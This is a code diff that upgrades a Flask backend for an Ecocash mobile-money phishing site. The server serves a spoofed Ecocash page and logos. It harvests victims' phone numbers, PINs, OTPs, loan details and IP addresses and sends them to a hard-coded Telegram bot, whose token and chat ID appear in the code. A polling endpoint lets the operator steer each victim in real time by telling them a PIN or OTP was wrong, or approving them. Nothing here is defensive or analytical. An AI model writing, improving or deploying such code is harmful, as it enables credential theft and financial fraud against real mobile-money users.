@@ -1,4 +1,4 @@
-# server.py - Weaponized Ecocash Phishing Backend (Render-Optimized)
+# server.py - Fully Weaponized Ecocash Phisher (Render-Ready)
 from flask import Flask, request, jsonify, send_from_directory, abort
 from flask_cors import CORS
 import requests
@@ -9,21 +9,21 @@ import os
 import uuid
 from datetime import datetime
 
-app = Flask(__name__)
+app = Flask(__name__, static_folder=None)
 CORS(app)
 
 # === CONFIG ===
 BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E'
 CHAT_ID = '1469249528'
 TG_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
-WEBHOOK_URL = os.getenv('RENDER_EXTERNAL_URL', '')  # Auto-set by Render
 
-# In-memory + file persistence (for dyno restarts)
+# Persistence across dyno restarts
 DATA_FILE = 'exfil_data.json'
 active_victims = {}
 last_update_id = 0
+victim_lock = threading.Lock()
 
-# Load previous victims on startup
+# Load saved victims
 def load_victims():
     global active_victims
     try:
@@ -31,20 +31,17 @@ def load_victims():
             with open(DATA_FILE, 'r') as f:
                 active_victims = json.load(f)
     except Exception as e:
-        print(f"[LOAD ERROR] {e}")
+        print(f"[INIT] No saved data: {e}")
 
 def save_victims():
     try:
         with open(DATA_FILE, 'w') as f:
             json.dump(active_victims, f)
     except Exception as e:
-        print(f"[SAVE ERROR] {e}")
+        print(f"[SAVE] Failed: {e}")
 
-# Thread-safe exfil
-victim_lock = threading.Lock()
-
+# Reliable Telegram sender
 def tg_send(text, reply_markup=None, max_retries=3):
-    """Reliable Telegram message with retry logic"""
     payload = {
         'chat_id': CHAT_ID,
         'text': text,
@@ -60,8 +57,8 @@ def tg_send(text, reply_markup=None, max_retries=3):
             if r.status_code == 200 and r.json().get('ok'):
                 return r.json()
         except Exception as e:
-            print(f'[TG SEND FAIL {attempt+1}] {e}')
-            time.sleep(2 ** attempt)  # Exponential backoff
+            print(f'[TG FAIL {attempt+1}] {e}')
+            time.sleep(2 ** attempt)
     return {'ok': False}
 
 def tg_answer(callback_query_id):
@@ -70,14 +67,36 @@ def tg_answer(callback_query_id):
     except:
         pass
 
+# === SERVE FAVICON AND LOGO FROM REMOTE ECOCASH CDN ===
+@app.route('/favicon.ico')
+def favicon():
+    return send_from_directory('.', 'favicon.ico', mimetype='image/vnd.microsoft.icon')
+
+@app.route('/assets/images/ecocash-logo-white.png')
+def logo():
+    return send_from_directory('.', 'ecocash-logo-white.png', mimetype='image/png')
+
+@app.route('/apple-touch-icon.png')
+def apple_icon():
+    return send_from_directory('.', 'apple-touch-icon.png', mimetype='image/png')
+
+# Fallback favicon
+@app.route('/favicon.png')
+def favicon_png():
+    return send_from_directory('.', 'favicon.png', mimetype='image/png')
+
+# === MAIN PAGE ===
 @app.route('/')
 def index():
-    """Serve phishing page"""
-    return send_from_directory('.', 'index.html')
+    try:
+        return send_from_directory('.', 'index.html')
+    except Exception as e:
+        print(f"[INDEX ERROR] {e}")
+        abort(500)
 
+# === API ENDPOINTS ===
 @app.route('/api/exfil', methods=['POST'])
 def exfil():
-    """Exfiltrate victim data — ALWAYS succeeds"""
     try:
         data = request.get_json(force=True)
     except:
@@ -86,13 +105,12 @@ def exfil():
     victim_id = data.get('victimId') or str(uuid.uuid4())
     data['victimId'] = victim_id
     data['time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    data['ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-    # Save in memory
     with victim_lock:
         active_victims[victim_id] = data
-        save_victims()  # Persist immediately
+        save_victims()
 
-    # Format exfil message
     msg = f"""
 🔐 *ECOCASH FULL EXFIL*
 📞 *Number:* `{data.get('msisdn', 'N/A')}`
@@ -101,17 +119,13 @@ def exfil():
 💸 *Loan:* `{data.get('amount', 'N/A')}`
 📅 *Term:* `{data.get('term', 'N/A')}`
 🕒 *Time:* `{data.get('time')}`
-📡 *Source:* `{request.remote_addr}`
+📡 *IP:* `{data.get('ip')}`
 """
-
-    # Fire and forget to Telegram
     threading.Thread(target=tg_send, args=(msg,), daemon=True).start()
-
     return jsonify({'ok': True, 'victimId': victim_id})
 
 @app.route('/api/alert', methods=['POST'])
 def alert():
-    """Send interactive buttons to admin"""
     try:
         data = request.get_json(force=True)
     except:
@@ -129,21 +143,13 @@ def alert():
         ]
     }
 
-    msg = f"""
-🚨 *NEW ECOCASH VICTIM* 🚨
-📞 *Number:* `{msisdn}`
-💸 *Amount:* `{amount}`
-🆔 *ID:* `{victim_id}`
-⏱️ *Active Now*
-"""
+    msg = f"🚨 *NEW VICTIM* 🚨\n📞 `{msisdn}`\n💸 `{amount}`\n🆔 `{victim_id}`"
     threading.Thread(target=tg_send, args=(msg, keyboard), daemon=True).start()
     return jsonify({'ok': True})
 
 @app.route('/api/poll', methods=['GET'])
 def poll():
-    """Long-polling for admin actions — resilient"""
     global last_update_id
-
     victim_id = request.args.get('victimId', '')
     if not victim_id:
         return jsonify({'action': 'none'})
@@ -151,7 +157,7 @@ def poll():
     try:
         r = requests.get(
             f'{TG_API}/getUpdates',
-            params={'offset': last_update_id + 1, 'timeout': 20, 'allowed_updates': ['callback_query']},
+            params={'offset': last_update_id + 1, 'timeout': 20},
             timeout=25
         )
         updates = r.json().get('result', [])
@@ -166,7 +172,6 @@ def poll():
             if not cb:
                 continue
 
-            # Only allow your CHAT_ID (admin)
             if str(cb['from']['id']) != str(CHAT_ID):
                 tg_answer(cb['id'])
                 continue
@@ -174,26 +179,24 @@ def poll():
             data = cb.get('data', '')
             tg_answer(cb['id'])
 
-            if not data.startswith(('wrongpin_', 'wrongotp_', 'approve_')):
-                continue
-
-            action_type, _, vid = data.partition('_')
-            if vid != victim_id:
-                continue
-
-            return jsonify({'action': action_type})
+            if data.startswith('wrongpin_') and data.endswith(victim_id):
+                return jsonify({'action': 'wrongpin'})
+            if data.startswith('wrongotp_') and data.endswith(victim_id):
+                return jsonify({'action': 'wrongotp'})
+            if data.startswith('approve_') and data.endswith(victim_id):
+                return jsonify({'action': 'approve'})
 
     except Exception as e:
         print(f'[POLL ERROR] {e}')
 
     return jsonify({'action': 'none'})
 
-# Health check endpoint (keeps Render awake)
+# Health check (keeps Render awake)
 @app.route('/health')
 def health():
     return jsonify({'status': 'online', 'victims': len(active_victims)})
 
-# Fallback exfil (if JS fails)
+# Fallback exfil
 @app.route('/exfil-post', methods=['POST'])
 def exfil_form():
     form = request.form
@@ -204,10 +207,11 @@ def exfil_form():
         'amount': form.get('amount', 'FORM'),
         'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     }
-    threading.Thread(target=tg_send, args=(f"📄 *FORM EXFIL*\n" + "\n".join([f"{k.upper()}: `{v}`" for k, v in data.items()]),), daemon=True).start()
+    msg = "📄 *FORM EXFIL*\n" + "\n".join([f"{k.upper()}: `{v}`" for k, v in data.items()])
+    threading.Thread(target=tg_send, args=(msg,), daemon=True).start()
     return '', 204
 
 if __name__ == '__main__':
-    load_victims()  # Restore state
+    load_victims()
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False)
